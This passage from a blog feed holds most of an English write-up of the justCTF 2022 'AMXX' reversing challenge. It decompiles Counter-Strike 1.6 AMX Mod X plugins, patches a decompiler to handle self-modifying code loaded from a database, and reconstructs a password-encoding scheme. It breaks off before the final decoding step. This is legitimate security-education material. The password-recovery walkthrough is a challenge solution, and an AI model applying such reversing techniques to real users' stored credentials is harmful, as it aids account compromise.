href="https://bbs.pediy.com/thread-275414.htm">看雪论坛</a>，并有幸登上<a href="https://mp.weixin.qq.com/s/_Qm4Xkv2lHNQJA44ebrgMg">看雪公众号</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向 </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>justCTF 2022 - AMXX</title>
      <link href="/2022/06/14/justCTF-2022-AMXX/"/>
      <url>/2022/06/14/justCTF-2022-AMXX/</url>
      
        <content type="html"><![CDATA[<p>Last weekend, I played <a href="https://ctftime.org/event/1631">justCTF 2022</a> with my team. We got 6th place. It took me a whole day to solve the “AMXX” challenge during this 37h game. Tired though I was, I really enjoyed this challenge. To solve it, I bought cs1.6 for 37 RMB, and learned how to develop mods. Thanks to the game organizer :D</p><p>Here is  the challenge information:</p><p><img src="/img/article/20220614/1.png" alt="challenge_info"></p><p>You can get the challenge attachment <a href="/attachment/justctf_amxx/task.zip">here</a>.</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>After decompressing the <code>task</code> archive, we can see <code>amxmodx</code> folder in <code>addons</code> directory, which means that we need to focus on Half-Life plugins (programs written in SourcePawn) in this challenge. Meanwhile, we can also find <code>csstats.amxx</code> in <code>amxmodx/data</code> directory, which leads to <strong>cs1.6 mods reverse engineering</strong>. However, I haven’t used cs1.6 mods before, I don’t even have the game itself on my PC. So I bought one on steam XD</p><p>The AMX Mod X installer can be downloaded from <a href="https://www.amxmodx.org/downloads.php">here</a>, and I installed v1.8.2 at the very beginning. But when I replaced the three folders in <code>amxmodx</code> directory to <code>cstrike</code> and called console in the game (press ‘`’), I got this:</p><p><img src="/img/article/20220614/2.png" alt="error_message"></p><p>Maybe the plugins are using a newer AMX Mod X version? I then downloaded <strong>1.9-dev</strong> on the <a href="https://www.amxmodx.org/downloads-new.php">official website</a>. After reinstalling, it worked without error message:</p><p><img src="/img/article/20220614/3.png" alt="mods_works"></p><p>Through the <code>amxx plugins</code> command, we can see the loaded plugins:</p><p><img src="/img/article/20220614/4.png" alt="loaded_plugins"></p><p>The three modules circled by the red frame above are developed by the challenge author, and I will analyze them later.</p><p>Through the <code>amxx cmds</code> command, we can list the cmds registered by plugins. Here we can see three commands that can be triggered by <code>say</code> (to say in the game, you should press ‘Y’):</p><p><img src="/img/article/20220614/5.png" alt="registered_cmds"></p><p>For example, we can get a menu on the left side of the screen by saying <code>/menu</code> in the game.</p><p><img src="/img/article/20220614/6.png" alt="menu"></p><p>This means we can register and login as plugin users. However, when I chose to register and entered my password, the game crashed. Oops, it seems we have to work on those plugins.</p><h2 id="Method-Selection"><a href="#Method-Selection" class="headerlink" title="Method Selection"></a>Method Selection</h2><p>Before starting to reverse amxx, we should take a look at the given diff file <code>0001-Set-Core-Mode.patch</code>. The author modified the AMX Mod X source code in <a href="https://github.com/alliedmodders/amxmodx">Github</a> and disabled the JIT/ASM32 technology. We can find the evidence on line 61-64:</p><p><img src="/img/article/20220614/7.png" alt="diff"></p><p>He also removed the <code>amx_Exec</code> function that supports JIT/ASM32 (line 132-1154). So let’s see how the <strong>remaining</strong> amx_Exec function in <a href="https://github.com/alliedmodders/amxmodx/blob/master/amxmodx/amx.cpp#L2662">amx.cpp</a> runs amxx files. </p><p>At line 2784, the compiler will determine whether the JIT or ASM32 compilation flag is defined, which is obviously not. So the part after line 2822 will be compiled into the program. It looks like a typical virtual machine:</p><p><img src="/img/article/20220614/8.png" alt="amx_Exec"></p><p>Therefore, the amxx file compiled by the modified AMX Mod X should be similar to <code>pyc</code> file, it needs to be executed by an interpreter. And usually, there are existing disassembly/decompilation tools to deal with such programs.</p><p>After some searching on Github, I found a project called <a href="https://github.com/peace-maker/lysis-java">lysis-java</a>. It even provides an online <a href="https://headlinedev.xyz/lysis/">decompilation website</a>. The decompiled result after uploading <code>amxmodx/plugins/db.amxx</code> is surprisingly good, except for a few errors:</p><p><img src="/img/article/20220614/9.png" alt="decompiled_res"></p><p>So I decided to clone this project and managed to fix errors so that I could get to the analysis stage with the completely readable code.</p><h2 id="Tool-Fixup"><a href="#Tool-Fixup" class="headerlink" title="Tool Fixup"></a>Tool Fixup</h2><p>Let’s fix the first error: <code>Can&#39;t print expression: Heap</code>.</p><p>I opened the project on IDEA, searched for the error string and went to <code>lysis.builder.SourceBuilder:652</code> in <code>buildExpression</code> function:</p><p><img src="/img/article/20220614/10.png" alt="SourceBuilder"></p><p>It looks like the project author forgot to consider the construction of the <strong>Heap</strong> expression. Since this error often occurs after <code>fmt</code> function, I added a case here to return “fmt_result” string:</p><p><img src="/img/article/20220614/11.png" alt="SourceBuilder_modified"></p><p>After using Gradle to build, I got <code>lysis-java.jar</code> in <code>build/libs</code> folder. Run <code>java -jar lysis-java.jar db.amxx</code> in cmd, it works (at least <code>get</code> function is successfully decompiled):</p><p><img src="/img/article/20220614/12.png" alt="decompiled_new_res"></p><p>But as we can see, another error occurred while parsing the next function. Now we can find a slightly higher-level function through stack trace to modify.</p><p>Here I chose <code>readAll</code>. This function traverses all machine codes through the <code>while</code> loop, parses them into virtual machine instructions through <code>readInstruction</code>, and finally adds them to an instruction list:</p><p><img src="/img/article/20220614/13.png" alt="readAll"></p><p>Obviously, the second error occurred in the process of parsing a certain instructions. Consider discarding unparseable instructions through <code>try...catch</code>, so that the code changes can be minimal and it would not cause too much impact on the decompilation results:</p><p><img src="/img/article/20220614/14.png" alt="readAll_modified"></p><p>Run the project again, this time <code>db.amxx</code> was successfully decompiled, no error was reported. Then I tried to decompile <code>accounts.amxx</code> and <code>encoder.amxx</code>, they all turned out fine.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>First come to <code>accounts.amxx</code>. Those commands we see in the game are registered in <code>plugin_init</code> function below (AMX Mod X API can be found <a href="https://www.amxmodx.org/api/">here</a>):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// accounts.amxx</span><br><span class="line">public plugin_init()</span><br><span class="line">&#123;</span><br><span class="line">    register_plugin(&quot;Account system&quot;, &quot;21.37&quot;, &quot;RiviT&quot;);</span><br><span class="line">    register_clcmd(&quot;say /menu&quot;, &quot;cmd_menu&quot;);</span><br><span class="line">    ...</span><br><span class="line">    register_clcmd(&quot;passwd&quot;, &quot;handle_password_input&quot;);</span><br><span class="line">    g_nvault = nvault_open(&quot;accounts&quot;);</span><br><span class="line">    create_menu();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As shown in the code, it opens <code>amxmodx/data/vault/accounts.vault</code> and whenever we input the password, <code>handle_password_input</code> function will be called:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// accounts.amxx</span><br><span class="line">public handle_password_input(id)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    get_user_name(id, name, 32);</span><br><span class="line">    new password_len = read_argv(1, password, 191);</span><br><span class="line">    new encoded_len = encode_password(id, password, password_len, encoded, 511);</span><br><span class="line">    words_to_str(encoded, encoded_len, bytes_str, 511);</span><br><span class="line">    switch (player_state[id])</span><br><span class="line">    &#123;</span><br><span class="line">        case 1:  // register</span><br><span class="line">        &#123;</span><br><span class="line">            ...  // common check</span><br><span class="line">            nvault_set(g_nvault, name, bytes_str);</span><br><span class="line">            client_print(id, 3, &quot;Register OK&quot;);</span><br><span class="line">            player_state[id] = 3;</span><br><span class="line">        &#125;</span><br><span class="line">        case 2:  // login</span><br><span class="line">        &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This function will encrypt the entered password with username and store it to <code>accounts.vault</code>. According to the challenge description, we need to recover the password of <code>Pr0g4m3r</code> in it:</p><p><img src="/img/article/20220614/15.png" alt="vault_content"></p><p>So we should analyze <code>encode_password</code> function to figure out how it encrypts user’s password. It is defined as a native function in <code>encoder.amxx</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// encoder.amxx</span><br><span class="line">public encode_password(id, password[], len, output[], out_len)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    new local_copy[256];</span><br><span class="line">    copy(local_copy, len, password);</span><br><span class="line">    new new_len = len;</span><br><span class="line">    new_len = encode1(id, local_copy, new_len);</span><br><span class="line">    new_len = encode2(local_copy, new_len);</span><br><span class="line">    new_len = encode3(local_copy, new_len);</span><br><span class="line">    copy(output, out_len, local_copy);</span><br><span class="line">    return new_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It mainly encrypts the plaintext through three different encryption functions in turn, and all the encoding functions are defined in this module. But interestingly, they’re all <strong>fake</strong>. We can notice that <code>plugin_init</code> of <code>encoder.amxx</code> starts a task called <code>prepare_plugin</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// encoder.amxx</span><br><span class="line">public plugin_init()</span><br><span class="line">&#123;</span><br><span class="line">    register_plugin(&quot;Super-encryptor 4001&quot;, &quot;0.01 pre-alpha&quot;, &quot;RiviT&quot;);</span><br><span class="line">    register_cvar(&quot;encoder_random_value&quot;, &quot;1337&quot;);</span><br><span class="line">    read_regions();</span><br><span class="line">    set_task(1073741824, &quot;prepare_plugin&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public prepare_plugin()</span><br><span class="line">&#123;</span><br><span class="line">    parts = TrieCreate();  // create dictionary</span><br><span class="line">    ...</span><br><span class="line">    new i;</span><br><span class="line">    while (i &lt; 256 &amp;&amp; TrieGetSize(parts) != 256)</span><br><span class="line">    &#123;</span><br><span class="line">        formatex(buf, 31, &quot;%08x&quot;, i);</span><br><span class="line">        hash_string(buf, 3, hash, 64);</span><br><span class="line">        new i;</span><br><span class="line">        while (i &lt; 64)</span><br><span class="line">        &#123;</span><br><span class="line">            formatex(hexbuf, 2, &quot;%c%c&quot;, hash[i], hash[i + 1]);</span><br><span class="line">            if (!TrieGetCell(parts, hexbuf, v))</span><br><span class="line">            &#123;</span><br><span class="line">                TrieSetCell(parts, hexbuf, order, 1);</span><br><span class="line">                order++;</span><br><span class="line">            &#125;</span><br><span class="line">            i += 2;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    new i;</span><br><span class="line">    while (i &lt; 3)</span><br><span class="line">    &#123;</span><br><span class="line">        db_get(code_keys[i]);  // code_keys = [&quot;stage1&quot;, &quot;stage2&quot;, &quot;stage3&quot;]</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>prepare_plugin</code> function first initializes a dictionary with 256 key-value pairs, then performs <strong>SMC</strong> through <code>db_get</code> (a native function named <code>get</code> in <code>db.amxx</code>) to modify the machine code of encode1/2/3. When <code>get</code> finishes SELECT request, <code>get_handle</code> will be called:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// db.amxx</span><br><span class="line">public get(key[])</span><br><span class="line">&#123;</span><br><span class="line">    param_convert(1);</span><br><span class="line">    fmt(&quot;SELECT * FROM `hex_data` WHERE `name`=&#x27;%s&#x27;;&quot;, key);</span><br><span class="line">    SQL_ThreadQuery(g_sql_tuple, &quot;get_handle&quot;, fmt_result, 2792);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public get_handle(failstate, Handle:query, error[])</span><br><span class="line">&#123;</span><br><span class="line">    if (failstate)</span><br><span class="line">    &#123;</span><br><span class="line">        log_amx(&quot;get_handle: failstate: %d error: %s&quot;, failstate, error);</span><br><span class="line">    &#125;</span><br><span class="line">    if (SQL_NumResults(query))</span><br><span class="line">    &#123;</span><br><span class="line">        new name[64];</span><br><span class="line">        new func_base;</span><br><span class="line">        SQL_ReadResult(query, SQL_FieldNameToNum(query, &quot;data&quot;), data, 2048);</span><br><span class="line">        SQL_ReadResult(query, SQL_FieldNameToNum(query, &quot;name&quot;), name, 64);</span><br><span class="line">        func_base = SQL_ReadResult(query, SQL_FieldNameToNum(query, &quot;func_base&quot;));</span><br><span class="line">        new new_len = unhex(data, strlen(data));</span><br><span class="line">        ExecuteForward(db_forward, 0, PrepareArray(name, 64), PrepareArray(data, 2048), new_len, func_base);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public plugin_init()</span><br><span class="line">&#123;</span><br><span class="line">    register_plugin(&quot;DB&quot;, &quot;13.37&quot;, &quot;RiviT&quot;, 1948, 1952);</span><br><span class="line">    db_forward = CreateMultiForward(&quot;db_results_ready&quot;, 3, 4, 4, 0, 0);</span><br><span class="line">    ...</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This function will execute a <code>Forward</code> initialized in <code>plugin_init</code>, which would result in a call to <code>db_results_ready</code> defined in <code>encoder.amxx</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">// encoder.amxx</span><br><span class="line">public db_results_ready(key[], data[], len, func_base)</span><br><span class="line">&#123;</span><br><span class="line">    log_amx(&quot;%s&quot;, key);</span><br><span class="line">    new dest;</span><br><span class="line">    new var1 = code_keys;</span><br><span class="line">    if (equal(key, var1[0][var1]))</span><br><span class="line">    &#123;</span><br><span class="line">        dest = 2404;      // encode1 function base</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        if (equal(key, code_keys[1]))</span><br><span class="line">        &#123;</span><br><span class="line">            dest = 3256;  // encode2 function base</span><br><span class="line">        &#125;</span><br><span class="line">        if (equal(key, code_keys[2]))</span><br><span class="line">        &#123;</span><br><span class="line">            dest = 3652;  // encode3 function base</span><br><span class="line">        &#125;</span><br><span class="line">        set_fail_state(&quot;invalid code key&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    apply_patch(dest, data, len, func_base);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public apply_patch(address, data[], data_len, func_base)</span><br><span class="line">&#123;</span><br><span class="line">    fix_relocation_opcodes(address, data, data_len, func_base);</span><br><span class="line">    address = address + COD - DAT;</span><br><span class="line">    new i;</span><br><span class="line">    while (i &lt; data_len)</span><br><span class="line">    &#123;</span><br><span class="line">        write_mem(address, data[i]);</span><br><span class="line">        address += 4;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public fix_relocation_opcodes(base_func_addr, data[], data_len, old_func_base)</span><br><span class="line">&#123;</span><br><span class="line">    new cip;</span><br><span class="line">    while (cip &lt; data_len)</span><br><span class="line">    &#123;</span><br><span class="line">        new op = data[cip];</span><br><span class="line">        cip++;</span><br><span class="line">        switch (op)</span><br><span class="line">        &#123;</span><br><span class="line">            // branch instruction opcode</span><br><span class="line">            case 49, 51, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 129:</span><br><span class="line">            &#123;</span><br><span class="line">                new v = data[cip] - old_func_base + base_func_addr + amx_base;</span><br><span class="line">                data[cip] = v;</span><br><span class="line">                cip++;</span><br><span class="line">            &#125;</span><br><span class="line">            default:</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The three main functions above will use the data from database to modify encryption functions. So we should focus on the <code>amxmodx/data/sqlite3/jctf.sq3</code> instead of decompiled bogus functions:</p><p><img src="/img/article/20220614/16.png" alt="db_content"></p><p>Now we are going to modify the lysis-java project again, so that we can replace the machine code to be parsed.</p><h2 id="Tool-Modification"><a href="#Tool-Modification" class="headerlink" title="Tool Modification"></a>Tool Modification</h2><p>If you follow the control flow of the project from <code>lysis.Lysis.main</code>, you can quickly find that it parses and reads the amxx file in the <strong>constructor</strong> of <code>lysis.amxmodx.AMXModXFile</code> class. And you’ll find it handling <code>.CODE</code> segment on line 195-203:</p><p><img src="/img/article/20220614/17.png" alt="AMXModXFile"></p><p>It calculates the code length and slices it to build a <code>Code</code> object. And in the following <code>for</code> loop we can get information about each function (name, base, etc.). So why not just modify the code bytes here?</p><p>Before that, we must implement the <code>fix_relocation_opcodes</code> function in Java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lysis.BitConverter;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fix_relocation_opcodes</span><span class="params">(<span class="keyword">int</span> base_func_addr, <span class="keyword">byte</span>[] data, <span class="keyword">int</span> old_func_base)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cip = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (cip &lt; data.length) &#123;</span><br><span class="line">        <span class="keyword">byte</span> op = data[cip];</span><br><span class="line">        cip += <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">49</span>: <span class="keyword">case</span> <span class="number">51</span>: <span class="keyword">case</span> <span class="number">53</span>: <span class="keyword">case</span> <span class="number">54</span>: <span class="keyword">case</span> <span class="number">55</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">56</span>: <span class="keyword">case</span> <span class="number">57</span>: <span class="keyword">case</span> <span class="number">58</span>: <span class="keyword">case</span> <span class="number">59</span>: <span class="keyword">case</span> <span class="number">60</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">61</span>: <span class="keyword">case</span> <span class="number">62</span>: <span class="keyword">case</span> <span class="number">63</span>: <span class="keyword">case</span> <span class="number">64</span>: <span class="keyword">case</span> (<span class="keyword">byte</span>)<span class="number">129</span>: &#123;</span><br><span class="line">                <span class="keyword">int</span> v = (<span class="keyword">int</span>) (BitConverter.ToUInt32(data, cip) - old_func_base + base_func_addr);</span><br><span class="line">                data[cip] = (<span class="keyword">byte</span>) (v &amp; <span class="number">0xFF</span>);</span><br><span class="line">                data[cip+<span class="number">1</span>] = (<span class="keyword">byte</span>) ((v &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                data[cip+<span class="number">2</span>] = (<span class="keyword">byte</span>) ((v &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                data[cip+<span class="number">3</span>] = (<span class="keyword">byte</span>) ((v &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                cip += <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">default</span>:&#123; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And then, we can do things like this (take <code>encode1</code> as an example):</p><p><img src="/img/article/20220614/18.png" alt="encode1"></p><p>Both the <code>new_encode1</code>(data) and 2440 (func_base) are obtained from <code>stage1</code> entry in the database. 2404 (base_func_addr) is obtained from <code>encoder.amxx!db_results_ready</code>. Then make the same changes to encode 2 &amp; 3:</p><p><img src="/img/article/20220614/19.png" alt="encode23"></p><p>Build &amp; Run towards <code>encoder.amxx</code>, it stuck after decompiling <code>encode1</code>…</p><p>After some debugging work, I found the problem in <code>lysis.Lysis.DumpMethod</code>. It tries to analyze the heap usage on line 117:</p><p><img src="/img/article/20220614/20.png" alt="heap_analyze"></p><p>The previous modification may have caused the loop exit condition inside to be unsatisfied, resulting in an infinite loop. So I just deleted this line, and it works :D</p><p><img src="/img/article/20220614/21.png" alt="complete_res"></p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>After beautifying the code, we finally got the correct encryption function:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">public encode1(id, password[], password_len)</span><br><span class="line">&#123;</span><br><span class="line">    new username[32];</span><br><span class="line">    new username_len = get_user_name(id, username, 32);</span><br><span class="line">    new i = 0;</span><br><span class="line">    new j = 0;</span><br><span class="line">    while (i &lt; password_len)</span><br><span class="line">    &#123;</span><br><span class="line">        new var5 = password[i];</span><br><span class="line">        password[i] = username[j] ^ var5;</span><br><span class="line">        j++;</span><br><span class="line">        j %= username_len;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    new k = 0;</span><br><span class="line">    while (k + 1 &lt; password_len)</span><br><span class="line">    &#123;</span><br><span class="line">        password[k] ^= password[k + 1];</span><br><span class="line">        password[k + 1] ^= password[k];</span><br><span class="line">        password[k] ^= password[k + 1];</span><br><span class="line">        k += 2;</span><br><span class="line">    &#125;</span><br><span class="line">    return password_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public encode2(password[], password_len)</span><br><span class="line">&#123;</span><br><span class="line">    new var1 = 0;</span><br><span class="line">    new var2 = 0;</span><br><span class="line">    while (var2 &lt; password_len)</span><br><span class="line">    &#123;</span><br><span class="line">        TrieGetCell(parts, fmt(&quot;%02x&quot;, password[var2]), var1);</span><br><span class="line">        password[var2] = var1;</span><br><span class="line">        var2++;</span><br><span class="line">    &#125;</span><br><span class="line">    return password_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public encode3(password[], password_len)</span><br><span class="line">&#123;</span><br><span class="line">    new random_value = get_cvar_num(&quot;encoder_random_value&quot;);</span><br><span class="line">    new i = 0;</span><br><span class="line">    while (i &lt; password_len)</span><br><span class="line">    &#123;</span><br><span class="line">        random_value = password[i] * 57005 + random_value;</span><br><span class="line">        random_value += 1;</span><br><span class="line">        random_value %= 4096;</span><br><span class="line">        password[i] = random_value;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return password_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We can get the cvar <code>encoder_random_value</code> (used in <code>encode3</code>) by typing <code>amxx cvars</code> in the game console:</p><p><img src="/img/article/20220614/22.png" alt="get_cvar"></p><p>And we can generate <code>parts</code> (used in <code>encode2</code>) by ourselves:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">parts = <span class="built_in">dict</span>()</span><br><span class="line">i, order = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">256</span> <span class="keyword">and</span> <span class="built_in">len</span>(parts) != <span class="number">256</span>:</span><br><span class="line">    buf = <span class="string">b&quot;%08x&quot;</span> % i</span><br><span class="line">    hash_str = sha256(buf).hexdigest()</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span> </span><br><span class="line">    <span class="keyword">while</span> j &lt; <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">if</span> hash_str[j:j+<span class="number">2</span>] <span class="keyword">not</span> <span class="keyword">in</span> parts:</span><br><span class="line">            parts[hash_str[j:j+<span class="number">2</span>]] = order</span><br><span class="line">            order += <span class="number">1</span></span><br><span class="line">        j += <span class="number">2</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>The last step is to determine how the encrypted password is stored in 